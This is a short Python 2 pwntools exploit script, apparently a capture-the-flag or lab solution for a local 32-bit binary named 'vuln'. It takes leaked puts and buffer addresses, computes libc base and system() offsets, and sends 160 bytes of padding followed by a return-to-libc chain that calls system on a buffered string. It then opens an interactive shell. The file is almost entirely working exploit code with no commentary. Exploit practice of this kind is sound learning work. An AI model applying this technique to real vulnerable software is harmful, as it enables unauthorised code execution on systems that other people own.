
#!/usr/bin/python2

from pwn import *
import sys

LOCAL = True

context.arch = 'i386'
context.terminal = "/bin/bash"

def info(s):
	log.info(s)


def exploit(r):
	# bypass PIE
	r.recvuntil("puts: ")
	addr = r.readline().strip()	
	PUTS_PLT = int(addr,16)
	LIBC     = PUTS_PLT - 0x5f140 #0x5f880
	SYSTEM 	 = LIBC + 0x0003a940 #0x0003ab40

	r.recvuntil("useful_string: ")
	addr = r.readline().strip()
	BUFFER = int(addr,16)
	POPRET = BUFFER - 0x1aab	
	
	print "LIBC   :",hex(LIBC)
	print "SYSTEM :",hex(SYSTEM)
	
	# send payload
	pay = "A"*160
	
	pay += p32(SYSTEM)
	pay += p32(POPRET)
	pay += p32(BUFFER)

	r.sendline(pay)
	
	r.interactive()
	return


if __name__ == '__main__':
    
	r = process(['./vuln'])
	print util.proc.pidof(r)
	pause()
	exploit(r)
        
